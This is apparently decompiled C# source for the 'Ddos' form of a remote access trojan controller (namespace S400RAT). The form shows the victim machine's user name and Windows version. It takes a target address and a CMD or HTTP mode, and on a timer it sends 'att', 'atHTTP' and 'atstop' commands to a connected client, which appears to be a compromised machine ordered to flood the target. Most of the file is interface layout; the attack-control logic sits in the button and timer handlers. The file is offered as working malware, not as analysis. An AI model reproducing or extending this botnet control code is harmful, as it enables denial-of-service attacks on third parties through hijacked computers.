using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Microsoft.VisualBasic.CompilerServices;
using SQLABC_ModernUI;

namespace S400RAT;

[DesignerGenerated]
public class Ddos : Form
{
	public IContainer icontainer_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2AnimateWindow1")]
	public Guna2AnimateWindow guna2AnimateWindow_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2BorderlessForm1")]
	public Guna2BorderlessForm guna2BorderlessForm_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel1")]
	public Panel panel_0;

	[AccessedThroughProperty("panel5")]
	[CompilerGenerated]
	public Panel panel_1;

	[AccessedThroughProperty("n")]
	[CompilerGenerated]
	public Label label_0;

	[CompilerGenerated]
	[AccessedThroughProperty("w")]
	public Label label_1;

	[AccessedThroughProperty("PictureBox1")]
	[CompilerGenerated]
	public PictureBox pictureBox_0;

	[AccessedThroughProperty("Label2")]
	[CompilerGenerated]
	public Label label_2;

	[AccessedThroughProperty("Label7")]
	[CompilerGenerated]
	public Label label_3;

	[CompilerGenerated]
	[AccessedThroughProperty("Label1")]
	public Label label_4;

	[AccessedThroughProperty("pictureBox3")]
	[CompilerGenerated]
	public PictureBox pictureBox_1;

	[AccessedThroughProperty("label9")]
	[CompilerGenerated]
	public Label label_5;

	[AccessedThroughProperty("Guna2ControlBox1")]
	[CompilerGenerated]
	public Guna2ControlBox guna2ControlBox_0;

	[AccessedThroughProperty("CCC")]
	[CompilerGenerated]
	public Panel panel_2;

	[AccessedThroughProperty("Stopss")]
	[CompilerGenerated]
	public Guna2GradientButton sdqyomVmbp;

	[AccessedThroughProperty("OK")]
	[CompilerGenerated]
	public Guna2GradientButton guna2GradientButton_0;

	[AccessedThroughProperty("PictureBox4")]
	[CompilerGenerated]
	public PictureBox pictureBox_2;

	[AccessedThroughProperty("L2")]
	[CompilerGenerated]
	public ListView listView_0;

	[AccessedThroughProperty("ColumnHeader1")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_0;

	[AccessedThroughProperty("Label4")]
	[CompilerGenerated]
	public Label label_6;

	[CompilerGenerated]
	[AccessedThroughProperty("Com")]
	public Guna2ComboBox guna2ComboBox_0;

	[AccessedThroughProperty("Text1")]
	[CompilerGenerated]
	public Guna2TextBox guna2TextBox_0;

	[AccessedThroughProperty("CMD")]
	[CompilerGenerated]
	public Timer timer_0;

	[AccessedThroughProperty("HTTP")]
	[CompilerGenerated]
	public Timer timer_1;

	[AccessedThroughProperty("Num")]
	[CompilerGenerated]
	public Guna2TextBox guna2TextBox_1;

	[AccessedThroughProperty("SqlabC_ControlMini1")]
	[CompilerGenerated]
	public SQLABC_ControlMini sqlabc_ControlMini_0;

	[AccessedThroughProperty("Clos")]
	[CompilerGenerated]
	public Timer timer_2;

	public Client sk;

	public Client C;

	public virtual Panel Panel1
	{
		[CompilerGenerated]
		get
		{
			return panel_0;
		}
		[CompilerGenerated]
		set
		{
			panel_0 = value;
		}
	}

	public virtual Panel panel5
	{
		[CompilerGenerated]
		get
		{
			return panel_1;
		}
		[CompilerGenerated]
		set
		{
			panel_1 = value;
		}
	}

	internal virtual Label n
	{
		[CompilerGenerated]
		get
		{
			return label_0;
		}
		[CompilerGenerated]
		set
		{
			label_0 = value;
		}
	}

	internal virtual Label w
	{
		[CompilerGenerated]
		get
		{
			return label_1;
		}
		[CompilerGenerated]
		set
		{
			label_1 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_0;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_0 = value;
		}
	}

	public virtual Label Label2
	{
		[CompilerGenerated]
		get
		{
			return label_2;
		}
		[CompilerGenerated]
		set
		{
			label_2 = value;
		}
	}

	public virtual Label Label7
	{
		[CompilerGenerated]
		get
		{
			return label_3;
		}
		[CompilerGenerated]
		set
		{
			label_3 = value;
		}
	}

	public virtual Label Label1
	{
		[CompilerGenerated]
		get
		{
			return label_4;
		}
		[CompilerGenerated]
		set
		{
			label_4 = value;
		}
	}

	public virtual PictureBox pictureBox3
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_1;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_1 = value;
		}
	}

	public virtual Label label9
	{
		[CompilerGenerated]
		get
		{
			return label_5;
		}
		[CompilerGenerated]
		set
		{
			label_5 = value;
		}
	}

	internal virtual Guna2ControlBox Guna2ControlBox1
	{
		[CompilerGenerated]
		get
		{
			return guna2ControlBox_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_5;
			Guna2ControlBox guna2ControlBox = guna2ControlBox_0;
			if (guna2ControlBox != null)
			{
				guna2ControlBox.Click -= value2;
			}
			guna2ControlBox_0 = value;
			guna2ControlBox = guna2ControlBox_0;
			if (guna2ControlBox != null)
			{
				guna2ControlBox.Click += value2;
			}
		}
	}

	public virtual Panel CCC
	{
		[CompilerGenerated]
		get
		{
			return panel_2;
		}
		[CompilerGenerated]
		set
		{
			panel_2 = value;
		}
	}

	internal virtual Guna2GradientButton Stopss
	{
		[CompilerGenerated]
		get
		{
			return sdqyomVmbp;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_4;
			Guna2GradientButton guna2GradientButton = sdqyomVmbp;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click -= value2;
			}
			sdqyomVmbp = value;
			guna2GradientButton = sdqyomVmbp;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click += value2;
			}
		}
	}

	internal virtual Guna2GradientButton OK
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientButton_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_1;
			Guna2GradientButton guna2GradientButton = guna2GradientButton_0;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click -= value2;
			}
			guna2GradientButton_0 = value;
			guna2GradientButton = guna2GradientButton_0;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click += value2;
			}
		}
	}

	public virtual PictureBox PictureBox4
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_2;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_2 = value;
		}
	}

	internal virtual ListView L2
	{
		[CompilerGenerated]
		get
		{
			return listView_0;
		}
		[CompilerGenerated]
		set
		{
			listView_0 = value;
		}
	}

	public virtual Label Label4
	{
		[CompilerGenerated]
		get
		{
			return label_6;
		}
		[CompilerGenerated]
		set
		{
			label_6 = value;
		}
	}

	internal virtual Guna2ComboBox Com
	{
		[CompilerGenerated]
		get
		{
			return guna2ComboBox_0;
		}
		[CompilerGenerated]
		set
		{
			guna2ComboBox_0 = value;
		}
	}

	internal virtual Guna2TextBox Text1
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_0;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_0 = value;
		}
	}

	internal virtual Timer CMD
	{
		[CompilerGenerated]
		get
		{
			return timer_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_2;
			Timer timer = timer_0;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			timer_0 = value;
			timer = timer_0;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	internal virtual Timer HTTP
	{
		[CompilerGenerated]
		get
		{
			return timer_1;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_3;
			Timer timer = timer_1;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			timer_1 = value;
			timer = timer_1;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	internal virtual Guna2TextBox Num
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_1;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_1 = value;
		}
	}

	internal virtual SQLABC_ControlMini SqlabC_ControlMini1
	{
		[CompilerGenerated]
		get
		{
			return sqlabc_ControlMini_0;
		}
		[CompilerGenerated]
		set
		{
			sqlabc_ControlMini_0 = value;
		}
	}

	public Ddos()
	{
		base.Load += Ddos_Load;
		method_0();
	}

	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	public void method_0()
	{
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Ddos));
		vmethod_1(new Guna2AnimateWindow(icontainer_0));
		vmethod_3(new Guna2BorderlessForm(icontainer_0));
		panel5 = new Panel();
		n = new Label();
		w = new Label();
		PictureBox1 = new PictureBox();
		Label2 = new Label();
		Label7 = new Label();
		Label1 = new Label();
		pictureBox3 = new PictureBox();
		label9 = new Label();
		Guna2ControlBox1 = new Guna2ControlBox();
		CCC = new Panel();
		Text1 = new Guna2TextBox();
		Com = new Guna2ComboBox();
		Stopss = new Guna2GradientButton();
		OK = new Guna2GradientButton();
		Panel1 = new Panel();
		PictureBox4 = new PictureBox();
		L2 = new ListView();
		vmethod_5(new ColumnHeader());
		Label4 = new Label();
		CMD = new Timer(icontainer_0);
		HTTP = new Timer(icontainer_0);
		Num = new Guna2TextBox();
		SqlabC_ControlMini1 = new SQLABC_ControlMini();
		vmethod_7(new Timer(icontainer_0));
		panel5.SuspendLayout();
		((ISupportInitialize)PictureBox1).BeginInit();
		((ISupportInitialize)pictureBox3).BeginInit();
		CCC.SuspendLayout();
		Panel1.SuspendLayout();
		((ISupportInitialize)PictureBox4).BeginInit();
		SuspendLayout();
		vmethod_0().AnimationType = Guna2AnimateWindow.AnimateWindowType.AW_BLEND;
		vmethod_0().TargetForm = this;
		vmethod_2().ContainerControl = this;
		panel5.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		panel5.BackColor = Color.FromArgb(37, 42, 64);
		panel5.Controls.Add(n);
		panel5.Controls.Add(w);
		panel5.Controls.Add(PictureBox1);
		panel5.Controls.Add(Label2);
		panel5.Controls.Add(Label7);
		panel5.Controls.Add(Label1);
		panel5.Controls.Add(pictureBox3);
		panel5.Controls.Add(label9);
		panel5.Location = new Point(0, 2);
		panel5.Name = "panel5";
		panel5.Size = new Size(303, 125);
		panel5.TabIndex = 128;
		n.AutoSize = true;
		n.Font = new Font("Nirmala UI", 9.75f);
		n.ForeColor = Color.FromArgb(158, 161, 176);
		n.Location = new Point(94, 81);
		n.Name = "n";
		n.Size = new Size(18, 17);
		n.TabIndex = 109;
		n.Text = "--";
		w.AutoSize = true;
		w.Font = new Font("Nirmala UI", 9.75f);
		w.ForeColor = Color.FromArgb(158, 161, 176);
		w.Location = new Point(94, 102);
		w.Name = "w";
		w.Size = new Size(18, 17);
		w.TabIndex = 108;
		w.Text = "--";
		PictureBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		PictureBox1.Image = (Image)componentResourceManager.GetObject("PictureBox1.Image");
		PictureBox1.Location = new Point(242, 7);
		PictureBox1.Name = "PictureBox1";
		PictureBox1.Size = new Size(53, 38);
		PictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox1.TabIndex = 107;
		PictureBox1.TabStop = false;
		Label2.AutoSize = true;
		Label2.Font = new Font("Nirmala UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label2.ForeColor = Color.White;
		Label2.Location = new Point(4, 7);
		Label2.Name = "Label2";
		Label2.Size = new Size(112, 25);
		Label2.TabIndex = 106;
		Label2.Text = "Ddos Attack";
		Label7.AutoSize = true;
		Label7.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label7.ForeColor = Color.FromArgb(158, 161, 176);
		Label7.Location = new Point(19, 100);
		Label7.Name = "Label7";
		Label7.Size = new Size(68, 17);
		Label7.TabIndex = 4;
		Label7.Text = "Windows :";
		Label1.AutoSize = true;
		Label1.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label1.ForeColor = Color.FromArgb(158, 161, 176);
		Label1.Location = new Point(6, 79);
		Label1.Name = "Label1";
		Label1.Size = new Size(81, 17);
		Label1.TabIndex = 3;
		Label1.Text = "User Name :";
		pictureBox3.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		pictureBox3.Image = (Image)componentResourceManager.GetObject("pictureBox3.Image");
		pictureBox3.Location = new Point(242, 59);
		pictureBox3.Name = "pictureBox3";
		pictureBox3.Size = new Size(53, 58);
		pictureBox3.SizeMode = PictureBoxSizeMode.Zoom;
		pictureBox3.TabIndex = 2;
		pictureBox3.TabStop = false;
		label9.AutoSize = true;
		label9.Font = new Font("Nirmala UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		label9.ForeColor = Color.FromArgb(84, 131, 255);
		label9.Location = new Point(4, 44);
		label9.Name = "label9";
		label9.Size = new Size(111, 25);
		label9.TabIndex = 0;
		label9.Text = "Information";
		Guna2ControlBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		Guna2ControlBox1.BackColor = Color.Transparent;
		Guna2ControlBox1.BorderColor = Color.Transparent;
		Guna2ControlBox1.FillColor = Color.FromArgb(46, 51, 73);
		Guna2ControlBox1.HoverState.Parent = Guna2ControlBox1;
		Guna2ControlBox1.IconColor = Color.White;
		Guna2ControlBox1.Location = new Point(498, 2);
		Guna2ControlBox1.Name = "Guna2ControlBox1";
		Guna2ControlBox1.PressedColor = Color.FromArgb(24, 30, 54);
		Guna2ControlBox1.ShadowDecoration.Parent = Guna2ControlBox1;
		Guna2ControlBox1.Size = new Size(45, 29);
		Guna2ControlBox1.TabIndex = 127;
		CCC.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		CCC.BackColor = Color.FromArgb(37, 42, 64);
		CCC.Controls.Add(Text1);
		CCC.Controls.Add(Com);
		CCC.Controls.Add(Stopss);
		CCC.Controls.Add(OK);
		CCC.ForeColor = Color.Transparent;
		CCC.Location = new Point(9, 143);
		CCC.Name = "CCC";
		CCC.Size = new Size(529, 104);
		CCC.TabIndex = 126;
		Text1.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		Text1.Animated = true;
		Text1.AutoRoundedCorners = true;
		Text1.BackColor = Color.FromArgb(37, 42, 64);
		Text1.BorderColor = Color.FromArgb(0, 126, 249);
		Text1.BorderRadius = 13;
		Text1.BorderStyle = DashStyle.Custom;
		Text1.Cursor = Cursors.IBeam;
		Text1.DefaultText = "";
		Text1.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		Text1.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		Text1.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		Text1.DisabledState.Parent = Text1;
		Text1.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		Text1.FillColor = Color.FromArgb(37, 42, 64);
		Text1.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		Text1.FocusedState.Parent = Text1;
		Text1.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Text1.ForeColor = Color.White;
		Text1.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		Text1.HoverState.Parent = Text1;
		Text1.Location = new Point(13, 19);
		Text1.Margin = new Padding(3, 2, 3, 2);
		Text1.Name = "Text1";
		Text1.PasswordChar = '\0';
		Text1.PlaceholderForeColor = Color.Gray;
		Text1.PlaceholderText = "Denial of Service";
		Text1.SelectedText = "";
		Text1.ShadowDecoration.Parent = Text1;
		Text1.Size = new Size(507, 29);
		Text1.Style = TextBoxStyle.Material;
		Text1.TabIndex = 123;
		Com.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		Com.Animated = true;
		Com.AutoRoundedCorners = true;
		Com.BackColor = Color.FromArgb(37, 42, 64);
		Com.BorderColor = Color.FromArgb(0, 126, 249);
		Com.BorderRadius = 17;
		Com.DrawMode = DrawMode.OwnerDrawFixed;
		Com.DropDownStyle = ComboBoxStyle.DropDownList;
		Com.FillColor = Color.FromArgb(37, 42, 64);
		Com.FocusedColor = Color.FromArgb(94, 148, 255);
		Com.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		Com.FocusedState.Parent = Com;
		Com.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Com.ForeColor = Color.FromArgb(0, 192, 192);
		Com.HoverState.Parent = Com;
		Com.ItemHeight = 30;
		Com.Items.AddRange(new object[2] { "CMD", "HTTP" });
		Com.ItemsAppearance.Parent = Com;
		Com.Location = new Point(13, 58);
		Com.Name = "Com";
		Com.ShadowDecoration.Parent = Com;
		Com.Size = new Size(294, 36);
		Com.Style = TextBoxStyle.Material;
		Com.TabIndex = 121;
		Stopss.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		Stopss.Animated = true;
		Stopss.BackColor = Color.Transparent;
		Stopss.CheckedState.Parent = Stopss;
		Stopss.CustomImages.Parent = Stopss;
		Stopss.Enabled = false;
		Stopss.FillColor = Color.FromArgb(24, 30, 54);
		Stopss.FillColor2 = Color.FromArgb(24, 30, 54);
		Stopss.Font = new Font("Segoe UI", 9f);
		Stopss.ForeColor = Color.White;
		Stopss.HoverState.Parent = Stopss;
		Stopss.IndicateFocus = true;
		Stopss.Location = new Point(313, 58);
		Stopss.Name = "Stopss";
		Stopss.ShadowDecoration.Parent = Stopss;
		Stopss.Size = new Size(98, 36);
		Stopss.TabIndex = 120;
		Stopss.Text = "Stop";
		Stopss.UseTransparentBackground = true;
		OK.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		OK.Animated = true;
		OK.BackColor = Color.Transparent;
		OK.CheckedState.Parent = OK;
		OK.CustomImages.Parent = OK;
		OK.FillColor = Color.FromArgb(24, 30, 54);
		OK.FillColor2 = Color.FromArgb(24, 30, 54);
		OK.Font = new Font("Segoe UI", 9f);
		OK.ForeColor = Color.White;
		OK.HoverState.Parent = OK;
		OK.IndicateFocus = true;
		OK.Location = new Point(417, 58);
		OK.Name = "OK";
		OK.ShadowDecoration.Parent = OK;
		OK.Size = new Size(103, 36);
		OK.TabIndex = 117;
		OK.Text = "Start";
		OK.UseTransparentBackground = true;
		Panel1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		Panel1.BackColor = Color.FromArgb(37, 42, 64);
		Panel1.Controls.Add(PictureBox4);
		Panel1.Controls.Add(L2);
		Panel1.Controls.Add(Label4);
		Panel1.ForeColor = Color.Transparent;
		Panel1.Location = new Point(9, 255);
		Panel1.Name = "Panel1";
		Panel1.Size = new Size(529, 277);
		Panel1.TabIndex = 129;
		PictureBox4.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		PictureBox4.Image = (Image)componentResourceManager.GetObject("PictureBox4.Image");
		PictureBox4.Location = new Point(472, 3);
		PictureBox4.Name = "PictureBox4";
		PictureBox4.Size = new Size(48, 38);
		PictureBox4.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox4.TabIndex = 119;
		PictureBox4.TabStop = false;
		L2.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		L2.BackColor = Color.FromArgb(46, 51, 73);
		L2.Columns.AddRange(new ColumnHeader[1] { vmethod_4() });
		L2.ForeColor = Color.White;
		L2.HeaderStyle = ColumnHeaderStyle.None;
		L2.HideSelection = false;
		L2.Location = new Point(13, 51);
		L2.Name = "L2";
		L2.Size = new Size(507, 218);
		L2.TabIndex = 118;
		L2.UseCompatibleStateImageBehavior = false;
		L2.View = View.Details;
		vmethod_4().Width = 302;
		Label4.AutoSize = true;
		Label4.Font = new Font("Nirmala UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label4.ForeColor = Color.White;
		Label4.Location = new Point(8, 9);
		Label4.Name = "Label4";
		Label4.Size = new Size(129, 25);
		Label4.TabIndex = 0;
		Label4.Text = "Case of attack";
		CMD.Interval = 1000;
		HTTP.Interval = 1000;
		Num.Animated = true;
		Num.AutoRoundedCorners = true;
		Num.BackColor = Color.FromArgb(37, 42, 64);
		Num.BorderColor = Color.FromArgb(0, 126, 249);
		Num.BorderRadius = 13;
		Num.BorderStyle = DashStyle.Custom;
		Num.Cursor = Cursors.IBeam;
		Num.DefaultText = "500";
		Num.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		Num.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		Num.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		Num.DisabledState.Parent = Num;
		Num.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		Num.FillColor = Color.FromArgb(37, 42, 64);
		Num.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		Num.FocusedState.Parent = Num;
		Num.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Num.ForeColor = Color.White;
		Num.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		Num.HoverState.Parent = Num;
		Num.Location = new Point(600, 42);
		Num.Margin = new Padding(3, 2, 3, 2);
		Num.Name = "Num";
		Num.PasswordChar = '\0';
		Num.PlaceholderForeColor = Color.Gray;
		Num.PlaceholderText = "Speed";
		Num.SelectedText = "";
		Num.SelectionStart = 3;
		Num.ShadowDecoration.Parent = Num;
		Num.Size = new Size(61, 29);
		Num.Style = TextBoxStyle.Material;
		Num.TabIndex = 122;
		Num.Visible = false;
		SqlabC_ControlMini1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		SqlabC_ControlMini1.BackColor = Color.White;
		SqlabC_ControlMini1.BaseColor = Color.FromArgb(46, 51, 73);
		SqlabC_ControlMini1.Font = new Font("Marlett", 12f);
		SqlabC_ControlMini1.Location = new Point(477, 5);
		SqlabC_ControlMini1.Name = "SqlabC_ControlMini1";
		SqlabC_ControlMini1.Size = new Size(18, 18);
		SqlabC_ControlMini1.TabIndex = 134;
		SqlabC_ControlMini1.Text = "SqlabC_ControlMini1";
		SqlabC_ControlMini1.TextColor = Color.FromArgb(243, 243, 243);
		vmethod_6().Enabled = true;
		vmethod_6().Interval = 10;
		base.AutoScaleDimensions = new SizeF(6f, 13f);
		base.AutoScaleMode = AutoScaleMode.Font;
		BackColor = Color.FromArgb(46, 51, 73);
		base.ClientSize = new Size(545, 544);
		base.Controls.Add(SqlabC_ControlMini1);
		base.Controls.Add(Panel1);
		base.Controls.Add(Num);
		base.Controls.Add(panel5);
		base.Controls.Add(Guna2ControlBox1);
		base.Controls.Add(CCC);
		base.FormBorderStyle = FormBorderStyle.None;
		base.Name = "Ddos";
		Text = "Ddos";
		panel5.ResumeLayout(performLayout: false);
		panel5.PerformLayout();
		((ISupportInitialize)PictureBox1).EndInit();
		((ISupportInitialize)pictureBox3).EndInit();
		CCC.ResumeLayout(performLayout: false);
		Panel1.ResumeLayout(performLayout: false);
		Panel1.PerformLayout();
		((ISupportInitialize)PictureBox4).EndInit();
		ResumeLayout(performLayout: false);
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2AnimateWindow vmethod_0()
	{
		return guna2AnimateWindow_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_1(Guna2AnimateWindow WithEventsValue)
	{
		guna2AnimateWindow_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2BorderlessForm vmethod_2()
	{
		return guna2BorderlessForm_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_3(Guna2BorderlessForm WithEventsValue)
	{
		guna2BorderlessForm_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual ColumnHeader vmethod_4()
	{
		return columnHeader_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_5(ColumnHeader WithEventsValue)
	{
		columnHeader_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Timer vmethod_6()
	{
		return timer_2;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_7(Timer WithEventsValue)
	{
		EventHandler value = method_7;
		Timer timer = timer_2;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		timer_2 = WithEventsValue;
		timer = timer_2;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	public void method_1(object sender, EventArgs e)
	{
		OK.Enabled = false;
		Stopss.Enabled = true;
		Com.Enabled = false;
		L2.Items.Clear();
		if (Operators.CompareString(Com.Text, "", TextCompare: false) == 0)
		{
			Com.SelectedIndex = 0;
		}
		if (Operators.CompareString(Com.Text, "Cmd", TextCompare: false) == 0)
		{
			CMD.Start();
		}
		else
		{
			HTTP.Start();
		}
	}

	public void Ddos_Load(object sender, EventArgs e)
	{
		Com.SelectedIndex = 0;
		C.Send("Admin" + Class7.string_1);
	}

	public void method_2(object sender, EventArgs e)
	{
		try
		{
			C.Send("att" + Class7.string_1 + Text1.Text + Class7.string_1 + Conversions.ToString(500));
			L2.Items.Add("cmd \\ - " + Text1.Text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_3(object sender, EventArgs e)
	{
		try
		{
			C.Send("atHTTP" + Class7.string_1 + Text1.Text);
			L2.Items.Add("HTTP \\ - " + Text1.Text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_4(object sender, EventArgs e)
	{
		try
		{
			CMD.Enabled = false;
			HTTP.Enabled = false;
			OK.Enabled = true;
			Stopss.Enabled = false;
			Com.Enabled = true;
			L2.Items.Clear();
			C.Send("atstop");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_5(object sender, EventArgs e)
	{
		if (C != null)
		{
			C.CN = false;
		}
	}

	public void method_6(object sender, EventArgs e)
	{
		Hide();
	}

	public void method_7(object sender, EventArgs e)
	{
		if (!C.CN)
		{
			C.CN = false;
			Close();
		}
	}
}
